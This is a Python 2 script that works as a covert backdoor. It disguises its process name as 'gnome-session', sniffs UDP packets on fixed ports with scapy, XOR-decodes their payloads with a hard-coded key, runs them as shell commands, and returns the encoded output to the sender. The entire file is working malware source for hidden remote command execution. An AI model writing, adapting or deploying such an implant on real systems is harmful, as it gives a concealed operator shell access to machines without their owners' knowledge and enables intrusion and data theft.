import setproctitle
import sys
from scapy.all import*
import time
import os
from itertools import izip, cycle

INTERFACE_ = 'em1'
SPORT = 11234
DPORT = 8080
FILTER = "udp and src port {0} and dst port {1}".format(SPORT, DPORT)
KEY = "zdehjk"

print FILTER
# from https://gist.github.com/revolunet/2412240

def xor_crypt(data, key=KEY, encode=False, decode=False):
    if decode:
        message = ''.join(chr(ord(c)^ord(k)) for c,k in izip(data, cycle(key)))
    if encode:
        message = ''.join(chr(ord(c)^ord(k)) for c,k in izip(data, cycle(key)))
    return message


def xor_crypt_string(data, key=KEY, encode=False, decode=False):
    from itertools import izip, cycle
    import base64
    if decode:
        data = base64.decodestring(data)
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))
    if encode:
        return base64.encodestring(xored).strip()
    return xored

setproctitle.setproctitle('gnome-session')

#print setproctitle.getproctitle()

#somedata = "ls"
#print xor_crypt(somedata, encode=True)
#print xor_crypt(xor_crypt(somedata, encode=True), decode=True)

def customAction(packet):
    print "Running Command"
    print xor_crypt(packet.load, decode=True)
    command = os.popen(xor_crypt(packet.load, decode=True))
    command_result = command.read()
    print command_result
    dest_ip = packet[0][1].src
    print dest_ip
    send(IP(dst=dest_ip)/UDP(sport=DPORT, dport=SPORT)/xor_crypt(command_result, encode=True))
    return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst

sniff(filter=FILTER, prn=customAction)